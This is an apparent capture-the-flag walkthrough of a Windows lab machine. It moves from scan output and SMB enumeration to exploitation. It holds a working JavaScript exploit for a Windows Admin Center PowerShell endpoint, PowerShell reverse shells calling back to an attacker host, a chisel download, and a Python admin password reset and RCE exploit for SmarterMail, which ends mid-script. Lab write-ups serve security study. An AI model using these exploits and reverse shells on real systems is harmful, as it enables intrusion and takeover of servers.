
> [!INFO] Machine Info
> HTB Season 11 Week `#12`
> Machine `DanglingTree`
> OS `Windows`
> Difficulty Level `Medium`
## Reconnaissance
### Ports Scan
```bash
rustscan -a <target-ip> -- -sC -sV -T4 -oA nmap-result
```

```
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-08-09 18:08:55Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:   8267:2fbc:2f8c:4d51:5f85:1b63:bbb3:5a40
| SHA-1: d657:81fd:541a:cd7e:af8b:1a69:150f:1a29:9336:5f71
| -----BEGIN CERTIFICATE-----
| [REDACTED]
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-26T05:34:19
| Not valid after:  2114-03-26T05:44:18
| MD5:   9054:595f:c5e0:bb67:628f:f4fc:8d82:a8cf
| SHA-1: 9733:440c:1fd9:f7c9:db9e:d4e8:69b7:7b8e:8e71:7781
| -----BEGIN CERTIFICATE-----
| [REDACTED]
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:   8267:2fbc:2f8c:4d51:5f85:1b63:bbb3:5a40
| SHA-1: d657:81fd:541a:cd7e:af8b:1a69:150f:1a29:9336:5f71
| -----BEGIN CERTIFICATE-----
| [REDACTED]
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:   8267:2fbc:2f8c:4d51:5f85:1b63:bbb3:5a40
| SHA-1: d657:81fd:541a:cd7e:af8b:1a69:150f:1a29:9336:5f71
| -----BEGIN CERTIFICATE-----
| [REDACTED]
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: danglingtree.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.danglingtree.htb, DNS:danglingtree.htb, DNS:DANGLINGTREE
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-03T16:32:53
| Not valid after:  2106-08-03T16:32:53
| MD5:   8267:2fbc:2f8c:4d51:5f85:1b63:bbb3:5a40
| SHA-1: d657:81fd:541a:cd7e:af8b:1a69:150f:1a29:9336:5f71
| -----BEGIN CERTIFICATE-----
| [REDACTED]
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Issuer: commonName=dc.danglingtree.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-25T05:48:29
| Not valid after:  2026-09-24T05:48:29
| MD5:   4599:496f:7b7e:5e3a:060b:b62f:49a6:0f04
| SHA-1: c841:e9c4:c71c:273c:11ae:36e3:6a6e:80d5:44f5:695c
| -----BEGIN CERTIFICATE-----
| [REDACTED]
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
6600/tcp  open  ssl/mshvlm?   syn-ack
| tls-alpn: 
|   h2
|_  http/1.1
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Sun, 09 Aug 2026 18:09:12 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguomJdoSe6qLt3FBrX3mNdGl0a_crZ8KOc5B0cyQTcrNYxYcT3PE17ODcC8kBgFqQNJvIHyQpBJMAPq_3ltz6oKTlAvSZIgOgpWeFX_FZUT1LUfk3qmNlR4ScxL1d3aJm8s8; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=c1d8696bc2334b1da9e73b5af597230d; expires=Mon, 10 Aug 2026 18:09:13 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|     <head
|   HTTPOptions: 
|     HTTP/1.1 403 Forbidden
|     Connection: close
|     Date: Sun, 09 Aug 2026 18:09:13 GMT
|     Cache-Control: no-store
|     Cache-Control: max-age=0
|     Pragma: no-cache
|     Set-Cookie: .AspNetCore.Antiforgery.7Eyhia2WOxE=CfDJ8HsozULo80ZBsxvkNAKguok7L9eP1m62eZDTZJlaNCCi9sknKwugHvMOz2kfkkhR48m8PluIWFIAIuLSYWVYoeuUbK6nfM5rp3uRIy6QT13RR69g1Ff8tRR_gkPGxyMRpn5_k2w0dwrwmDYGsBB91ME; path=/; secure; samesite=none; Partitioned
|     Set-Cookie: WAC-SESSION=63995b2542284da79ba89a65c27fc4b2; expires=Mon, 10 Aug 2026 18:09:14 GMT; path=/; secure; samesite=lax; httponly
|     Set-Cookie: WAC-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: WAC-AAD=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Set-Cookie: XSRF-TOKEN=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/
|     Strict-Transport-Security: max-age=5184000; includeSubDomains; preload
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|_    <head
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.danglingtree.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.danglingtree.htb
| Issuer: commonName=danglingtree-DC-CA/domainComponent=danglingtree
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-26T05:41:20
| Not valid after:  2027-03-26T05:41:20
| MD5:   7f8b:9a97:773d:e83d:981a:f9cd:1cc7:f0ad
| SHA-1: 57db:0c74:fcba:80b5:4d4e:55d6:efec:eb60:4506:6b05
| -----BEGIN CERTIFICATE-----
| [REDACTED]
|_-----END CERTIFICATE-----
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         syn-ack Microsoft Windows RPC
49701/tcp open  msrpc         syn-ack Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
49742/tcp open  msrpc         syn-ack Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3389-TCP:V=7.95%I=7%D=8/9%Time=6A785FE6%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port6600-TCP:V=7.95%T=SSL%I=7%D=8/9%Time=6A785FF3%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,3000,"HTTP/1\.1\x20403\x20Forbidden\r\nConnection:\x20clo
SF:se\r\nDate:\x20Sun,\x2009\x20Aug\x202026\x2018:09:12\x20GMT\r\nCache-Co
SF:ntrol:\x20no-store\r\nCache-Control:\x20max-age=0\r\nPragma:\x20no-cach
SF:e\r\nSet-Cookie:\x20\.AspNetCore\.Antiforgery\.7Eyhia2WOxE=CfDJ8HsozULo
SF:80ZBsxvkNAKguomJdoSe6qLt3FBrX3mNdGl0a_crZ8KOc5B0cyQTcrNYxYcT3PE17ODcC8k
SF:BgFqQNJvIHyQpBJMAPq_3ltz6oKTlAvSZIgOgpWeFX_FZUT1LUfk3qmNlR4ScxL1d3aJm8s
SF:8;\x20path=/;\x20secure;\x20samesite=none;\x20Partitioned\r\nSet-Cookie
SF::\x20WAC-SESSION=c1d8696bc2334b1da9e73b5af597230d;\x20expires=Mon,\x201
SF:0\x20Aug\x202026\x2018:09:13\x20GMT;\x20path=/;\x20secure;\x20samesite=
SF:lax;\x20httponly\r\nSet-Cookie:\x20WAC-TOKEN=;\x20expires=Thu,\x2001\x2
SF:0Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\nSet-Cookie:\x20WAC-AAD=;\
SF:x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\nS
SF:et-Cookie:\x20XSRF-TOKEN=;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:0
SF:0:00\x20GMT;\x20path=/\r\nStrict-Transport-Security:\x20max-age=5184000
SF:;\x20includeSubDomains;\x20preload\r\n\r\n<!DOCTYPE\x20html>\r\n<html\x
SF:20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n\r\n<head
SF:")%r(HTTPOptions,3000,"HTTP/1\.1\x20403\x20Forbidden\r\nConnection:\x20
SF:close\r\nDate:\x20Sun,\x2009\x20Aug\x202026\x2018:09:13\x20GMT\r\nCache
SF:-Control:\x20no-store\r\nCache-Control:\x20max-age=0\r\nPragma:\x20no-c
SF:ache\r\nSet-Cookie:\x20\.AspNetCore\.Antiforgery\.7Eyhia2WOxE=CfDJ8Hsoz
SF:ULo80ZBsxvkNAKguok7L9eP1m62eZDTZJlaNCCi9sknKwugHvMOz2kfkkhR48m8PluIWFIA
SF:IuLSYWVYoeuUbK6nfM5rp3uRIy6QT13RR69g1Ff8tRR_gkPGxyMRpn5_k2w0dwrwmDYGsBB
SF:91ME;\x20path=/;\x20secure;\x20samesite=none;\x20Partitioned\r\nSet-Coo
SF:kie:\x20WAC-SESSION=63995b2542284da79ba89a65c27fc4b2;\x20expires=Mon,\x
SF:2010\x20Aug\x202026\x2018:09:14\x20GMT;\x20path=/;\x20secure;\x20samesi
SF:te=lax;\x20httponly\r\nSet-Cookie:\x20WAC-TOKEN=;\x20expires=Thu,\x2001
SF:\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r\nSet-Cookie:\x20WAC-AAD
SF:=;\x20expires=Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT;\x20path=/\r
SF:\nSet-Cookie:\x20XSRF-TOKEN=;\x20expires=Thu,\x2001\x20Jan\x201970\x200
SF:0:00:00\x20GMT;\x20path=/\r\nStrict-Transport-Security:\x20max-age=5184
SF:000;\x20includeSubDomains;\x20preload\r\n\r\n<!DOCTYPE\x20html>\r\n<htm
SF:l\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n\r\n<h
SF:ead");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-09T18:10:46
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 9563/tcp): CLEAN (Timeout)
|   Check 2 (port 33302/tcp): CLEAN (Timeout)
|   Check 3 (port 4334/udp): CLEAN (Timeout)
|   Check 4 (port 64395/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 6h59m33s
```

Add host
```bash
echo '<target-ip> danglingtree.htb dc.danglingtree.htb' | sudo tee -a /etc/hosts
```

### Share Enumeration
Checking the **SMB** service with guest user

```bash
smbclient -L //danglingtree.htb// -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
IT              Disk      
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
```

The share `IT` is interesting.

```bash
smbclient  //danglingtree.htb/IT -N
```

```
smb: \> ls
  .                                   D        0  Sun Apr  5 08:05:09 2026
  ..                                  D        0  Sun Apr  5 07:57:30 2026
  Security                            D        0  Sun Apr  5 08:05:20 2026

                7062015 blocks of size 4096. 2297169 blocks available
smb: \> cd Security\
smb: \Security\> ls
  .                                   D        0  Sun Apr  5 08:05:20 2026
  ..                                  D        0  Sun Apr  5 08:05:09 2026
  DanglingTree_RoE_Assessment.pdf      A    28905  Sat Apr  4 22:50:23 2026

                7062015 blocks of size 4096. 2297106 blocks available
```

We found the `DanglingTree_RoE_Assessment.pdf` . Let download this file and convert to text (or can manually read the `.pdf`)

```bash
pdftotext DanglingTree_RoE_Assessment.pdf DanglingTree_RoE_Assessment.txt
```

After analyzing this file, we found the low privilege user

```
anderson.w:R3dT3am@Acc3ss#01
```

Let's verify the credential

```bash
nxc smb <target-ip> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01'
```

```
SMB         10.129.10.238   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.238   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01
```

Nice, the credential is valid. Let enumeration more `users` and `shares` with that credential.

```bash
nxc smb <target-ip> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --shares
```

```
SMB         10.129.10.238   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.238   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
SMB         10.129.10.238   445    DC               [*] Enumerated shares
SMB         10.129.10.238   445    DC               Share           Permissions     Remark
SMB         10.129.10.238   445    DC               -----           -----------     ------
SMB         10.129.10.238   445    DC               ADMIN$                          Remote Admin
SMB         10.129.10.238   445    DC               C$                              Default share
SMB         10.129.10.238   445    DC               IPC$            READ            Remote IPC
SMB         10.129.10.238   445    DC               IT                              
SMB         10.129.10.238   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.10.238   445    DC               SYSVOL          READ            Logon server share
```

```bash
nxc smb <target-ip> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --users
```

```
SMB         10.129.10.238   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.238   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
SMB         10.129.10.238   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.10.238   445    DC               anderson.w                    2026-04-05 00:00:40 0        
SMB         10.129.10.238   445    DC               [*] Enumerated 1 local users: DANGLINGTREE
```

Nothing useful here, let try `rid-force` to get user lists

```bash
nxc smb <target-ip> -d danglingtree.htb -u anderson.w -p 'R3dT3am@Acc3ss#01' --users --rid-brute 3000
```

```
SMB         10.129.10.238   445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.10.238   445    DC               [+] danglingtree.htb\anderson.w:R3dT3am@Acc3ss#01 
SMB         10.129.10.238   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.10.238   445    DC               anderson.w                    2026-04-05 00:00:40 0        
SMB         10.129.10.238   445    DC               [*] Enumerated 1 local users: DANGLINGTREE
SMB         10.129.10.238   445    DC               498: DANGLINGTREE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.10.238   445    DC               500: DANGLINGTREE\Administrator (SidTypeUser)
SMB         10.129.10.238   445    DC               501: DANGLINGTREE\Guest (SidTypeUser)
SMB         10.129.10.238   445    DC               502: DANGLINGTREE\krbtgt (SidTypeUser)
SMB         10.129.10.238   445    DC               512: DANGLINGTREE\Domain Admins (SidTypeGroup)
SMB         10.129.10.238   445    DC               513: DANGLINGTREE\Domain Users (SidTypeGroup)
SMB         10.129.10.238   445    DC               514: DANGLINGTREE\Domain Guests (SidTypeGroup)
SMB         10.129.10.238   445    DC               515: DANGLINGTREE\Domain Computers (SidTypeGroup)
SMB         10.129.10.238   445    DC               516: DANGLINGTREE\Domain Controllers (SidTypeGroup)
SMB         10.129.10.238   445    DC               517: DANGLINGTREE\Cert Publishers (SidTypeAlias)
SMB         10.129.10.238   445    DC               518: DANGLINGTREE\Schema Admins (SidTypeGroup)
SMB         10.129.10.238   445    DC               519: DANGLINGTREE\Enterprise Admins (SidTypeGroup)
SMB         10.129.10.238   445    DC               520: DANGLINGTREE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.10.238   445    DC               521: DANGLINGTREE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.10.238   445    DC               522: DANGLINGTREE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.10.238   445    DC               525: DANGLINGTREE\Protected Users (SidTypeGroup)
SMB         10.129.10.238   445    DC               526: DANGLINGTREE\Key Admins (SidTypeGroup)
SMB         10.129.10.238   445    DC               527: DANGLINGTREE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.10.238   445    DC               528: DANGLINGTREE\Forest Trust Accounts (SidTypeGroup)
SMB         10.129.10.238   445    DC               529: DANGLINGTREE\External Trust Accounts (SidTypeGroup)
SMB         10.129.10.238   445    DC               553: DANGLINGTREE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.10.238   445    DC               571: DANGLINGTREE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.10.238   445    DC               572: DANGLINGTREE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.10.238   445    DC               1000: DANGLINGTREE\DC$ (SidTypeUser)
SMB         10.129.10.238   445    DC               1101: DANGLINGTREE\DnsAdmins (SidTypeAlias)
SMB         10.129.10.238   445    DC               1102: DANGLINGTREE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.10.238   445    DC               1103: DANGLINGTREE\jake.h (SidTypeUser)
SMB         10.129.10.238   445    DC               1105: DANGLINGTREE\Cert_Managers (SidTypeGroup)
SMB         10.129.10.238   445    DC               1106: DANGLINGTREE\Helpdesk_Cert_Support (SidTypeGroup)
SMB         10.129.10.238   445    DC               1107: DANGLINGTREE\Template_Editors (SidTypeGroup)
SMB         10.129.10.238   445    DC               1108: DANGLINGTREE\DevOps_PKI (SidTypeGroup)
SMB         10.129.10.238   445    DC               1109: DANGLINGTREE\Windows Admin Center CredSSP (SidTypeAlias)
SMB         10.129.10.238   445    DC               1110: DANGLINGTREE\svc_mail (SidTypeUser)
SMB         10.129.10.238   445    DC               1602: DANGLINGTREE\noah.b (SidTypeUser)
SMB         10.129.10.238   445    DC               1603: DANGLINGTREE\support-it (SidTypeGroup)
SMB         10.129.10.238   445    DC               1604: DANGLINGTREE\alex.o (SidTypeUser)
SMB         10.129.10.238   445    DC               2601: DANGLINGTREE\anderson.w (SidTypeUser)
```

We got a mount of user list from that command.

### Web Enumeration
We also have a web service on port `6600` called `Windows Admin Center`

![[Pasted image 20260819000153.png]]

Try to login with found credential `anderson.w`: `R3dT3am@Acc3ss#01` 
It was successful login. Then I tried to connect to the machine, but it not worked.

![[Pasted image 20260819002201.png]]

Let's find other way by checking the version of `Windows Admin Center`

![[Pasted image 20260819002224.png]]

> [!NOTED] Window Admin Center
> Version: `2511`
> Build: `2.6.4.11`

By checking the version, we can identify the target here

> [!WARNING] `CVE-2026-26119`
> Improper authentication in Windows Admin Center allows an authorized attacker to elevate privileges over a network.

> [!WARNING]  **Root Cause**
> Windows Admin Center incorrectly trusts the gateway's machine account when processing PowerShell execution requests through the WinREST API. While a legitimate session runs commands as the authenticated user, the vulnerable authentication chain causes WAC to instead trust and execute commands with the gateway computer account's privileges, leading to privilege escalation.

*Attack Vector*
The vulnerability exists in the PowerShell execution endpoint:
```
/api/services/WinREST/PowerShell/nodes/<node>/invokeCommand
```

*Exploitation Requirements*
- Valid authenticated WAC session (cookie)
- Matching XSRF-TOKEN for CSRF protection
- Module name and version (discoverable via JavaScript)
- Network access to the WAC gateway

#### Module Discovery
The required component values are exposed directly through the client-side JavaScript runtime:

```js
({
    name: MsftSme.self().Environment.name,
    version: MsftSme.self().Environment.version
});
```

![[Pasted image 20260819003759.png]]

Module was identified. Let's build the the `PoC` to confirm the ==RCE==

```js
// First define the helper function
async function invokeWac(script) {
    const match = document.cookie.match(/(?:^|; )XSRF-TOKEN=([^;]+)/);
    if (!match) throw new Error("XSRF-TOKEN was not present");

    const response = await fetch(
        "/api/services/WinREST/PowerShell/nodes/dc/invokeCommand",
        {
            method: "POST",
            credentials: "same-origin",
            headers: {
                "Content-Type": "application/json; charset=UTF-8",
                "X-Xsrf-Token": decodeURIComponent(match[1]),
                "X-Ms-Sme-Module-Name": "msft.sme.shell",
                "X-Ms-Sme-Module-Version": "6.8.9"
            },
            body: JSON.stringify({
                properties: {
                    script,
                    command: "Get-WACSMServerConnectionStatus",
                    module: "Microsoft.SME.ServerManager",
                    state: "ready",
                    useInProcRunspace: false,
                    invokeMode: "Polling"
                }
            })
        }
    );

    const result = await response.json();
    if (!response.ok) throw new Error(JSON.stringify(result));
    return result;
}

// Then execute a test command
const poc = await invokeWac("whoami; hostname");
console.log(poc);
```

![[Pasted image 20260819003359.png]]

The `RCE` is confirmed. 

## Exploitation
Now we can try to gain a reverse shell as `anderson.w`

```js
const callbackHost = "<attacker-ip>";
const callbackPort = 4444;

const reverseShell = `
$client = New-Object System.Net.Sockets.TCPClient('${callbackHost}', ${callbackPort});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 };

while (($count = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $command = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $count);
    $output = Invoke-Expression $command 2>&1 | Out-String;
    $prompt = $output + 'PS ' + (Get-Location).Path + '> ';
    $send = [Text.Encoding]::ASCII.GetBytes($prompt);
    $stream.Write($send, 0, $send.Length);
    $stream.Flush();
}

$client.Close();
`;

await invokeWac(reverseShell);
```

Start listener and gain shell

```bash
nc -lnvp 4444
```

```
Connection received on 10.129.10.238 59241

PS C:\WINDOWS\system32> whoami
danglingtree\anderson.w
```

### SmarterMail
Let check the ports usage

```powershell
etstat -ano
```

```
Proto  Local Address          Foreign Address        State           PID
TCP    0.0.0.0:17017          0.0.0.0:0              LISTENING       2140
TCP    127.0.0.1:25           0.0.0.0:0              LISTENING       2140
TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3688
TCP    127.0.0.1:110          0.0.0.0:0              LISTENING       2140
TCP    127.0.0.1:143          0.0.0.0:0              LISTENING       2140
TCP    127.0.0.1:587          0.0.0.0:0              LISTENING       2140
TCP    127.0.0.1:5222         0.0.0.0:0              LISTENING       2140
```

> [!HINT] Clue
> SMTP(25), POP3(110), IMAP(143), SMTP Submission(587), and XMPP(5222) all point to the same PID 2140, indicating that this is a locally running email and instant messaging integrated server program.

Let do port forwarding with ==chisel==
Download to *taget machine*

```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.66:8000/chisel.exe', 'C:\Windows\Temp\chisel.exe')
```

==Attacker Machine==
```bash
./chisel server --reverse --port 8080
```

==Target Machine==
```powershell
C:\Windows\Temp\chisel.exe client 10.10.14.66:8080 R:17017:127.0.0.1:17017
```

Now confirmed, it was `SmarterMail` web service. Now let's check this web service from browser

![[Pasted image 20260819013712.png]]

> [!NOTED] Recon
> `CVE-2026-23760` affects the `SmarterMail` system administrator password reset process. In the previous rid-force analysis, we discovered a potential user, `svc_mail`, who is highly likely to be the email system administrator.

We assigned a known password to `svc_mail` via the anonymous force-reset-password endpoint with `RCE` via Volume Mounts

```python
#!/usr/bin/env python3
"""
CVE-2026-23760 - SmarterMail < 9511 admin password reset + RCE via Volume Mounts
"""
import argparse
import json
import time
import urllib.request

def post(base, path, data, token=None, timeout=15):
    req = urllib.request.Request(base + path, data=json.dumps(data).encode(), headers={
        "Content-Type": "application/json",
    }, method="POST")
    if token:
        req.add_header("Authorization", "Bearer " + token)
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode()

def reset_admin_password(base, username, new_password):
    body = {
        "IsSysAdmin": "true",
        "OldPassword": "whatever",
        "Username": username,
        "NewPassword": new_password,
        "ConfirmPassword": new_password,
    }
    resp = json.loads(post(base, "/api/v1/auth/force-reset-password", body))
    if not resp.get("success"):
        raise RuntimeError(f"Password reset failed: {resp.get('message')} / {resp.get('debugInfo')}")
    print(f"[+] Password for '{username}' reset to '{new_password}'")
    return resp

def authenticate(base, username, new_password):
    auth = json.loads(post(base, "/api/v1/auth/authenticate-user", {
        "username": username, "password": new_password, "language": "en",
    }))
    if not auth.get("success"):
        raise RuntimeError("Authentication failed: " + str(auth))
    print(f"[+] Authenticated as '{auth.get('username')}' (admin={auth.get('isAdmin')})")
    return auth["accessToken"]

def create_mount(base, token, mount_path, command, timeout=12):
    payload = {
        "mountPath": mount_path,
        "commandMount": command,
        "commandUnmount": "",
        "useArgumentsInCommand": False,
        "enabled": True,
    }
    try:
        resp = post(base, "/api/v1/settings/sysadmin/AddOrUpdateMount", payload, token, timeout=timeout)
        print(f"[+] AddOrUpdateMount: {resp}")
        return resp
    except (TimeoutError, urllib.error.URLError):
        print("[!] Request timed out (server is waiting on the command). Expected for a "
              "persistent reverse shell - check your listener.")
        return None

def main():
    ap = argparse.ArgumentParser(description="CVE-2026-23760 SmarterMail admin takeover + RCE")
    ap.add_argument("target", help="e.g. http://127.0.0.1:17017")
    ap.add_argument("--username", default="svc_mail", help="sysadmin username (default: svc_mail)")
    ap.add_argument("--password", default="NewPassword123!@#", help="new admin password")
    ap.add_argument("--lhost", default="<attacker-ip>", help="reverse shell listener IP") # change ip here
    ap.add_argument("--lport", default="4445", help="reverse shell listener port")
    ap.add_argument("--command", default=None, help="custom command (overrides reverse shell)")
    ap.add_argument("--no-reset", action="store_true", help="skip password reset if already done")
    args = ap.parse_args()

    base = args.target.rstrip("/")

    if not args.no_reset:
        reset_admin_password(base, args.username, args.password)

    token = authenticate(base, args.username, args.password)

    if args.command:
        cmd = args.command
    else:
        ps = ("$client=New-Object System.Net.Sockets.TCPClient('%s',%s);"
              "$stream=$client.GetStream();"
              "[byte[]]$bytes=0..65535|%%{0};"
              "while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;"
              "$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
              "$sendback=(iex $data 2>&1|Out-String);"
              "$sendback2=$sendback+'PS '+(pwd).Path+'> ';"
              "$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);"
              "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
              "$client.Close()") % (args.lhost, args.lport)
